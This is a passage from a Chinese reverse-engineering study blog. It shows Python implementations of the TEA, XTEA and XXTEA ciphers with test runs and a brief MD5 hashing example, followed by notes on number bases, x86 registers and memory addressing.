class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># 参考 DASCTF &amp; CBCTF 2023 auuuu3的Exp</span><br><span class="hljs-comment"># 这里libnum.n2s()也可以转换，但是它是逆序输出，需要转换一下      </span><br></code></pre></td></tr></table></figure></li><li><p>python使用struct进行转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">res = [<span class="hljs-number">1767863401</span>, <span class="hljs-number">1700945779</span>, <span class="hljs-number">1633644133</span>, <span class="hljs-number">1852795999</span>, <span class="hljs-number">1633967975</span>, <span class="hljs-number">1769430905</span>, <span class="hljs-number">1970235508</span>, <span class="hljs-number">1870225268</span>, <span class="hljs-number">2037210997</span>, <span class="hljs-number">1769104991</span>, <span class="hljs-number">6581861</span>, <span class="hljs-number">0</span>]<br>result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(res)):<br>        result += struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, res[i]) <span class="hljs-comment"># &lt;I为小端序，&gt;I为大端序</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure></li></ol></li></ul><h3 id="算法实现-3"><a class="markdownIt-Anchor" href="#算法实现-3"></a> 算法实现</h3><h4 id="tea-2"><a class="markdownIt-Anchor" href="#tea-2"></a> Tea</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">v, k</span>):<br>    v0, v1 = c_uint32(v[<span class="hljs-number">0</span>]), c_uint32(v[<span class="hljs-number">1</span>])<br>    delta = <span class="hljs-number">0x9e3779b9</span> <br>    k0, k1, k2, k3 = k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>]<br><br>    total = c_uint32(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        total.value += delta <br>        v0.value += ((v1.value&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1.value + total.value) ^ ((v1.value&gt;&gt;<span class="hljs-number">5</span>) + k1)  <br>        v1.value += ((v0.value&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0.value + total.value) ^ ((v0.value&gt;&gt;<span class="hljs-number">5</span>) + k3)<br><br>    <span class="hljs-keyword">return</span> v0.value, v1.value <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v, k</span>):<br>    v0, v1 = c_uint32(v[<span class="hljs-number">0</span>]), c_uint32(v[<span class="hljs-number">1</span>])<br>    delta = <span class="hljs-number">0x9e3779b9</span> <br>    k0, k1, k2, k3 = k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>]<br><br>    total = c_uint32(delta * <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):                     <br>        v1.value -= ((v0.value&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0.value + total.value) ^ ((v0.value&gt;&gt;<span class="hljs-number">5</span>) + k3) <br>        v0.value -= ((v1.value&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1.value + total.value) ^ ((v1.value&gt;&gt;<span class="hljs-number">5</span>) + k1)  <br>        total.value -= delta<br><br>    <span class="hljs-keyword">return</span> v0.value, v1.value   <br>  <br><span class="hljs-comment"># test</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 待加密的明文，两个32位整型，即64bit的明文数据</span><br>    value = [<span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x78563412</span>]<br>    <span class="hljs-comment"># 四个key，每个是32bit，即密钥长度为128bit</span><br>    key = [<span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x4</span>]<br>  <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Data is : &quot;</span>, <span class="hljs-built_in">hex</span>(value[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(value[<span class="hljs-number">1</span>]))  <br>    res = encrypt(value, key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Encrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]))<br>    res = decrypt(res, key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Data is :  0x12345678 0x78563412</span><br><span class="hljs-string">Encrypted data is :  0x9a65a69a 0x67ed00f6</span><br><span class="hljs-string">Decrypted data is :  0x12345678 0x78563412</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="xtea"><a class="markdownIt-Anchor" href="#xtea"></a> xTea</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> * <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">v, key</span>):   <br>    v0, v1 = c_uint32(v[<span class="hljs-number">0</span>]), c_uint32(v[<span class="hljs-number">1</span>])<br>    delta = <span class="hljs-number">0x9E3779B9</span><br><br>    total = c_uint32(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):  <br>        v0.value += (((v1.value &lt;&lt; <span class="hljs-number">4</span>) ^ (v1.value &gt;&gt; <span class="hljs-number">5</span>)) + v1.value) ^ (total.value + key[total.value &amp; <span class="hljs-number">3</span>])<br>        total.value += delta <br>        v1.value += (((v0.value &lt;&lt; <span class="hljs-number">4</span>) ^ (v0.value &gt;&gt; <span class="hljs-number">5</span>)) + v0.value) ^ (total.value + key[(total.value&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])<br><br>    <span class="hljs-keyword">return</span> v0.value, v1.value <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v, key</span>):<br>    v0, v1  = c_uint32(v[<span class="hljs-number">0</span>]), c_uint32(v[<span class="hljs-number">1</span>])<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>  <br>    total = c_uint32(delta * <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1.value -= (((v0.value &lt;&lt; <span class="hljs-number">4</span>) ^ (v0.value &gt;&gt; <span class="hljs-number">5</span>)) + v0.value) ^ (total.value + key[(total.value&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])<br>        total.value -= delta <br>        v0.value -= (((v1.value &lt;&lt; <span class="hljs-number">4</span>) ^ (v1.value &gt;&gt; <span class="hljs-number">5</span>)) + v1.value) ^ (total.value + key[total.value &amp; <span class="hljs-number">3</span>])<br><br>    <span class="hljs-keyword">return</span> v0.value, v1.value <br>  <br><span class="hljs-comment"># test</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 待加密的明文，两个32位整型，即64bit的明文数据</span><br>    value = [<span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x78563412</span>]<br>    <span class="hljs-comment"># 四个key，每个是32bit，即密钥长度为128bit</span><br>    key = [<span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x4</span>]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Data is : &quot;</span>, <span class="hljs-built_in">hex</span>(value[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(value[<span class="hljs-number">1</span>]))<br>    res = encrypt(value, key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Encrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]))<br>    res = decrypt(res, key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Data is :  0x12345678 0x78563412</span><br><span class="hljs-string">Encrypted data is :  0xae685ec7 0x59af4238</span><br><span class="hljs-string">Decrypted data is :  0x12345678 0x78563412</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="xxtea"><a class="markdownIt-Anchor" href="#xxtea"></a> xxTea</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MX</span>(<span class="hljs-params">z, y, total, key, p, e</span>):<br>    temp1 = (z.value&gt;&gt;<span class="hljs-number">5</span> ^ y.value&lt;&lt;<span class="hljs-number">2</span>) + (y.value&gt;&gt;<span class="hljs-number">3</span> ^ z.value&lt;&lt;<span class="hljs-number">4</span>)<br>    temp2 = (total.value ^ y.value) + (key[(p&amp;<span class="hljs-number">3</span>) ^ e.value] ^ z.value)<br>  <br>    <span class="hljs-keyword">return</span> c_uint32(temp1 ^ temp2)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">n, v, key</span>):<br>    delta = <span class="hljs-number">0x9e3779b9</span> <br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span>//n<br><br>    total = c_uint32(<span class="hljs-number">0</span>)<br>    z = c_uint32(v[n-<span class="hljs-number">1</span>])<br>    e = c_uint32(<span class="hljs-number">0</span>)<br>  <br>    <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:<br>        total.value += delta  <br>        e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>):<br>            y = c_uint32(v[p+<span class="hljs-number">1</span>])<br>            v[p] = c_uint32(v[p] + MX(z,y,total,key,p,e).value).value<br>            z.value = v[p]<br>        y = c_uint32(v[<span class="hljs-number">0</span>])<br>        v[n-<span class="hljs-number">1</span>] = c_uint32(v[n-<span class="hljs-number">1</span>] + MX(z,y,total,key,n-<span class="hljs-number">1</span>,e).value).value<br>        z.value = v[n-<span class="hljs-number">1</span>]<br>        rounds -= <span class="hljs-number">1</span> <br><br>    <span class="hljs-keyword">return</span> v<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">n, v, key</span>):<br>    delta = <span class="hljs-number">0x9e3779b9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span>//n <br>  <br>    total = c_uint32(rounds * delta)<br>    y = c_uint32(v[<span class="hljs-number">0</span>])<br>    e = c_uint32(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:<br>        e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            z = c_uint32(v[p-<span class="hljs-number">1</span>])<br>            v[p] = c_uint32((v[p] - MX(z,y,total,key,p,e).value)).value<br>            y.value = v[p]<br>        z = c_uint32(v[n-<span class="hljs-number">1</span>])  <br>        v[<span class="hljs-number">0</span>] = c_uint32(v[<span class="hljs-number">0</span>] - MX(z,y,total,key,<span class="hljs-number">0</span>,e).value).value<br>        y.value = v[<span class="hljs-number">0</span>]  <br>        total.value -= delta<br>        rounds -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v <br><br><br><span class="hljs-comment">#  test  </span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-comment"># 该算法中每次可加密不只64bit的数据，并且加密的轮数由加密数据长度决定</span><br>    v = [<span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x78563412</span>]<br>    k = [<span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x4</span>]<br>    n = <span class="hljs-number">2</span><span class="hljs-comment">#这里2为轮数，也就是v的个数</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Data is : &quot;</span>, <span class="hljs-built_in">hex</span>(v[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(v[<span class="hljs-number">1</span>]))<br>    res = encrypt(n, v, k)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Encrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]))<br>    res = decrypt(n, res, k)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Data is :  0x12345678 0x78563412</span><br><span class="hljs-string">Encrypted data is :  0xef86c2bb 0x25f31b5e</span><br><span class="hljs-string">Decrypted data is :  0x12345678 0x78563412</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="md5"><a class="markdownIt-Anchor" href="#md5"></a> MD5</h2><h3 id="算法原理-5"><a class="markdownIt-Anchor" href="#算法原理-5"></a> 算法原理</h3><p><a href="https://blog.csdn.net/hawinlolo/article/details/94464237">MD5 加密算法详解</a></p><h3 id="算法实现-4"><a class="markdownIt-Anchor" href="#算法实现-4"></a> 算法实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>obj = hashlib.md5()<br><span class="hljs-comment"># 构造一个hashlib的对象(obj)，此处的 md5 可以替换为SHA1, SHA224, SHA256, SHA384, SHA512等加密算法</span><br>obj.update(<span class="hljs-string">&quot;使用md5加密&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-comment"># update对指定字符串进行加密，但加密前需要对数据进行转码为 byte 类型</span><br>result = obj.hexdigest()<br><span class="hljs-comment"># 这里hexdigest与digest相同，使用二进制表示(实际转化为十六进制形式表示)</span><br><span class="hljs-built_in">print</span>(result)<br> <br><span class="hljs-comment"># 也可以不创建对象，直接进行加密</span><br>obj = hashlib.sha1(<span class="hljs-string">&quot;1231231231&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><h2 id="aes"><a class="markdownIt-Anchor" href="#aes"></a> AES</h2><p><a href="https://blog.csdn.net/chouzhou9701/article/details/122019967">python实现AES加密解密</a></p><p>补充：这里还涉及到White box AES的问题，详细看博客中另一篇文章[白盒AES分析]</p>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编基础</title>
    <link href="/posts/84aee333.html"/>
    <url>/posts/84aee333.html</url>
    
    <content type="html"><![CDATA[<h1 id="进制"><a class="markdownIt-Anchor" href="#进制"></a> 进制</h1><h2 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义：</h2><ul><li>N进制指逢N进1的一系列符号</li></ul><h2 id="进制之间的关系"><a class="markdownIt-Anchor" href="#进制之间的关系"></a> 进制之间的关系</h2><h3 id="0d-0x"><a class="markdownIt-Anchor" href="#0d-0x"></a> 0d -&gt; 0x</h3><table border="1">  <tr>    <td>二进制</td>    <td>0</td>    <td>1</td>    <td>10</td>    <td>11</td>    <td>100</td>    <td>101</td>    <td>110</td>    <td>111</td>  </tr>  <tr>    <td>十六进制</td>    <td>0</td>    <td>1</td>    <td>2</td>    <td>3</td>    <td>4</td>    <td>5</td>    <td>6</td>    <td>7</td>  </tr>  <tr>    <td>二进制</td>    <td>1000</td>    <td>1001</td>    <td>1010</td>    <td>1011</td>    <td>1100</td>    <td>1101</td>    <td>1110</td>    <td>1111</td>  </tr>  <tr>    <td>十六进制</td>    <td>8</td>    <td>9</td>    <td>A</td>    <td>B</td>    <td>C</td>    <td>D</td>    <td>E</td>    <td>F</td>  </tr></table><h3 id="八进制"><a class="markdownIt-Anchor" href="#八进制"></a> 八进制</h3><ul><li>八进制加法表</li></ul><table border="1">  <tr>    <td>1 + 1 = 2</td>    <td></td>    <td></td>    <td></td>    <td></td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 + 2 = 3</td>    <td>2 + 2 = 4</td>    <td></td>    <td></td>    <td></td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 + 3 = 4</td>    <td>2 + 3 = 5</td>    <td>3 + 3 = 6</td>    <td></td>    <td></td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 + 4 = 5</td>    <td>2 + 4 = 6</td>    <td>3 + 4 = 7</td>    <td>4 + 4 = 10</td>    <td></td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 + 5 = 6</td>    <td>2 + 5 = 7</td>    <td>3 + 5 = 10</td>    <td>4 + 5 = 11</td>    <td>5 + 5 = 12</td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 + 6 = 7</td>    <td>2 + 6 = 10</td>    <td>3 + 6 = 11</td>    <td>4 + 6 = 12</td>    <td>5 + 6 = 13</td>    <td>6 + 6 = 14</td>    <td></td>  </tr>  <tr>    <td>1 + 7 = 10</td>    <td>2 + 7 = 11</td>    <td>3 + 7 = 12</td>    <td>4 + 7 = 13</td>    <td>5 + 7 = 14</td>    <td>6 + 7 = 15</td>    <td>7 + 7 = 16</td>  </tr></table><ul><li>八进制乘法表</li></ul><table border="1">  <tr>    <td>1 * 1 = 1</td>    <td></td>    <td></td>    <td></td>    <td></td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 * 2 = 2</td>    <td>2 * 2 = 4</td>    <td></td>    <td></td>    <td></td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 * 3 = 3</td>    <td>2 * 3 = 6</td>    <td>3 * 3 = 11</td>    <td></td>    <td></td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 * 4 = 4</td>    <td>2 * 4 = 10</td>    <td>3 * 4 = 14</td>    <td>4 * 4 = 20</td>    <td></td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 * 5 = 5</td>    <td>2 * 5 = 12</td>    <td>3 * 5 = 17</td>    <td>4 * 5 = 24</td>    <td>5 * 5 = 31</td>    <td></td>    <td></td>  </tr>  <tr>    <td>1 * 6 = 6</td>    <td>2 * 6 = 14</td>    <td>3 * 6 = 22</td>    <td>4 * 6 = 30</td>    <td>5 * 6 = 36</td>    <td>6 * 6 = 44</td>    <td></td>  </tr>  <tr>    <td>1 * 7 = 7</td>    <td>2 * 7 = 16</td>    <td>3 * 7 = 25</td>    <td>4 * 7 = 34</td>    <td>5 * 7 = 43</td>    <td>6 * 7 = 52</td>    <td>7 * 7 = 61</td>  </tr></table><hr /><h1 id="数据宽度与逻辑运算"><a class="markdownIt-Anchor" href="#数据宽度与逻辑运算"></a> 数据宽度与逻辑运算</h1><h2 id="数据宽度"><a class="markdownIt-Anchor" href="#数据宽度"></a> 数据宽度</h2><ul><li><p>字节/字(8bit)——可存储两个十六进制—8位二进制，例如FF</p><ul><li>十六进制占4位</li></ul></li><li><p>补：</p><ul><li>补码每一位取反加1为原码</li><li>原码每一位取反加1为补码</li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291118937.png" alt="202210031849487" /></p><h2 id="逻辑运算"><a class="markdownIt-Anchor" href="#逻辑运算"></a> 逻辑运算</h2><ul><li>在最底层中计算<span class="label label-primary">2 + 3 = 5</span><ul><li><p>先转换为二进制，0010赋值为X，0011赋值为Y</p></li><li><p>之后将X与Y进行xor与and，若and之后的结果左移一位后有一位不为0，则把xor的结果赋值为X，and的结果赋值为Y，再进行计算</p></li><li><p>若最后and的结果左移一位之后每一位都为0，那么xor就是最后的结果</p><div class="note note-info">            <p>一个数进行了两次异或还是它本身</p>          </div></li></ul></li></ul><h1 id="寄存器与内存"><a class="markdownIt-Anchor" href="#寄存器与内存"></a> 寄存器与内存</h1><h2 id="区别"><a class="markdownIt-Anchor" href="#区别"></a> 区别</h2><ul><li><p>1、寄存器位于CPU内部,执行速度快，但比较贵</p></li><li><p>2、内存速度相对较慢,但成本较低，所以可以做的很大</p></li><li><p>3、寄存器和内存没有本质区别,都是用于存储数据的容器,都是定宽的</p></li><li><p>4、寄存器常用的共8个：EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI</p></li><li><p>5、计算机中的几个常用的计量单位：BYTE,WORD,DWORD</p><ul><li><p>BYTE——字节——8(BIT)</p></li><li><p>WORD——字——16(BIT)</p></li><li><p>DWORD——双字——32(BIT)</p></li></ul>   <div class="note note-info">            <p>1 KB  =  1024 BYTE,<br />1 MB  =  1024 KB,<br />1 GB  =  1024 MB</p>          </div></li><li><p>6、内存的数量特别庞大，无法对每个内存单位都起一个名字，所以用编号代替，我们称计算机CPU32位或者64位</p><ul><li>计算机内存的每一个字节会有一个编号(即内存编号的单位是字节)<ul><li>如：<span class="label label-primary">0x00000000，0x00000001…… 0xFFFFFFFF</span></li></ul></li><li>32位计算机的编号最大是32位,也就是32个1,换成16进制为FFFFFFFF,也就是说,32位计算机内存寻址的最大范围是32位.而内存的单位是字节,那内存中能存储的信息最多位FFFFFFFF + 1字节,即4G(可以打补丁等进行扩展)</li></ul></li></ul><h2 id="内存"><a class="markdownIt-Anchor" href="#内存"></a> 内存</h2><ul><li><p>内存格式</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291118828.png" alt="202210032015464" /></p><ul><li>编号加<code>[]</code>表示这是内存编号，否则就是立即数</li><li>往往将多个字节连在一起命名为一个编号，这就导致一个编号(包含了4个字节的内存空间)可以存储32位</li></ul></li><li><p>从指定内存中写入/读取数据</p><ul><li><code>mov dword ptr ds:[0x0012FF34], 0x12345678</code>(mov是移动数据)<ul><li>遵循高位在后原则，即<code>[0x0012FF34]</code>对应的是78，而下一位<code>[0x0012FF35]</code>则是对应56(一个字节是8位，即两个十六进制数为一组)，同时这个就是将4个字节组成了一个内存空间并命名</li></ul></li><li><code>mov eax, dword ptr ds:[0x0012FF34]</code><ul><li><code>dword</code>：要读\写多少  此时是4字节，byte = 1字节，word = 2字节</li><li><code>ptr</code>: Point代表后面是一个指针(存的不是值，而是地址)</li><li><code>ds</code>：段寄存器</li><li><code>[0x0012FF34]</code>：内存编号，必须是32位，前面的0可以省略，会自动补0<ul><li>这是一个地址编号，相当于指针</li></ul></li></ul></li><li>注意：<ul><li>地址编号不要随便写，因为内存是由保护的，并不是所有的内存都可以直接读写(需要特别处理)，建议地址编号写成esp的值</li></ul></li></ul></li></ul><h2 id="通用寄存器"><a class="markdownIt-Anchor" href="#通用寄存器"></a> 通用寄存器</h2><h3 id="类别"><a class="markdownIt-Anchor" href="#类别"></a> 类别</h3><table><thead><tr><th>32位寄存器</th><th>16位寄存器</th><th>8位寄存器</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AH    AL</td></tr><tr><td>EBX</td><td>BX</td><td>BH    BL</td></tr><tr><td>ECX</td><td>CX</td><td>CH    CL</td></tr><tr><td>EDX</td><td>DX</td><td>DH    DL</td></tr><tr><td>ESP</td><td>SP</td><td></td></tr><tr><td>EBP</td><td>BP</td><td></td></tr><tr><td>ESI</td><td>SI</td><td></td></tr><tr><td>EDI</td><td>DI</td><td></td></tr></tbody></table><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291119557.png" alt="202210031849381" /></p><blockquote><p>AX为EAX的低位</p><p>AH为AX的高位，AL为AX的低位</p></blockquote><h3 id="32位寄存器"><a class="markdownIt-Anchor" href="#32位寄存器"></a> 32位寄存器</h3><table><thead><tr><th>寄存器</th><th>主要用途</th><th>存储数据的范围</th></tr></thead><tbody><tr><td>EAX</td><td>累加器</td><td>0 – 0xFFFFFFFF</td></tr><tr><td>ECX</td><td>计数</td><td>0 – 0xFFFFFFFF</td></tr><tr><td>EDX</td><td>I/O指针</td><td>0 – 0xFFFFFFFF</td></tr><tr><td>EBX</td><td>DS段的数据指针</td><td>0 – 0xFFFFFFFF</td></tr><tr><td>ESP</td><td>堆栈指针</td><td>0 – 0xFFFFFFFF</td></tr><tr><td>EBP</td><td>SS段的数据指针</td><td>0 